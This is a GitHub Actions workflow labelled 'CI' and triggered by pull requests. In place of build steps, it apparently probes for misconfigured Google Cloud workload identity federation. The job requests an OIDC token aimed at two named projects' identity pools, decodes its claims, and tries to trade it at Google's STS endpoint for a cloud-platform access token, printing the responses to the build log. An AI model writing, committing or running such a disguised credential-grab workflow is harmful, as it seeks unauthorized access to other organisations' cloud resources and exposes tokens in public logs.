name: CI
on:
  pull_request:
permissions:
  id-token: write
  contents: read
jobs:
  oidc-probe:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          echo "EVENT=$GITHUB_EVENT_NAME RUN=$GITHUB_RUN_ID REPO=$GITHUB_REPOSITORY"
          echo "HEADREF=$GITHUB_HEAD_REF BASEREF=$GITHUB_BASE_REF REF=$GITHUB_REF"
          echo "IDURL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          if [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then echo "NO_OIDC_REQUEST_URL"; exit 0; fi
          AUD="//iam.googleapis.com/projects/533362582499/locations/global/workloadIdentityPools/github/providers/electricitymaps-contrib"
          A2="//iam.googleapis.com/projects/196494084534/locations/global/workloadIdentityPools/github-actions-wi-pool/providers/github-actions-wi-provider"
          TOK=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p')
          echo "JWT_LEN=${#TOK}"
          echo "--- CLAIMS ---"
          echo "$TOK" | cut -d. -f2 | python3 -c "import sys,base64,json;s=sys.stdin.read().strip();s+='='*(-len(s)%4);print(json.dumps(json.loads(base64.urlsafe_b64decode(s)),indent=1))" 2>/dev/null || echo "CLAIM_DECODE_FAILED"
          for aud in "$AUD" "$A2"; do
            code=$(curl -sS -o sts_out.txt -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
              -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
              -d "audience=$aud" \
              --data-urlencode "subject_token=$TOK" \
              -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
              -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
              -d "scope=https://www.googleapis.com/auth/cloud-platform")
            echo "STS_AUD=$aud HTTP=$code"
            head -c 800 sts_out.txt; echo
          done
